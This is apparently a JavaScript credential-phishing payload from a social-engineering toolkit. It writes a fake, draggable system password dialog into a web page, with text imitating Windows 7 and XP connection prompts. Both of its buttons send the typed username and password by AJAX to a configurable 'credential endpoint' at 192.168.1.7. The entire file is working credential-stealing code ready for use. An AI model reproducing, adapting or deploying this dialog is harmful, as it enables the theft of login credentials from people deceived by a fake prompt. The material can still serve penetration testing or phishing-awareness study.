//These variables control the text that is presented on the dialogs
var WIN7_CONNECT_TO = "Enter your password to connect to: 1.1.1.1";
var WIN7_DOMAIN = "Domain: SomeDomain";
var WINXP_CONNECT_TO = "Connecting to 1.1.1.1";

//These variables control your credential endpoint
var URL = "http://192.168.1.7/blah.php";

document.write("<script type='text/javascript' src='../js/jquery-1.8.3.js'></script>");
document.write("<script type='text/javascript' src='../js/jquery-ui.js'></script>");


document.write("<link rel='stylesheet' type='text/css' href='ubuntu.css'/>");
document.write("<script>$(document).ready(function(){$('#expander').click(function(){$('#modal').toggleClass('modal_expanded');$('#ok_button').toggleClass('button_expanded');$('#cancel_button').toggleClass('button_expanded');$('#help_img').toggleClass('button_expanded');});});</script>");
document.write("<div id='modal' class='modal'>");
document.write("<script>function capture(){$('#modal').hide();$.ajax({url: '"+URL+"',data:{u:$('#user_name').val(),p:$('#password').val()}});}</script>");
document.write("<input type='button' id='expander'/>");
document.write("<form>");
document.write("<input type='password' name='password' id='password' class='diag_input' />");
document.write("<input type='button' onclick='capture()' value='' id='ok_button' class='diag_button'/>");
document.write("<input type='button' onclick='capture()' value='' id='cancel_button' class='diag_button'/>");
document.write("</form>");
document.write("</div>");
document.write("<script>$('#modal').show();$('#modal').draggable();</script>");

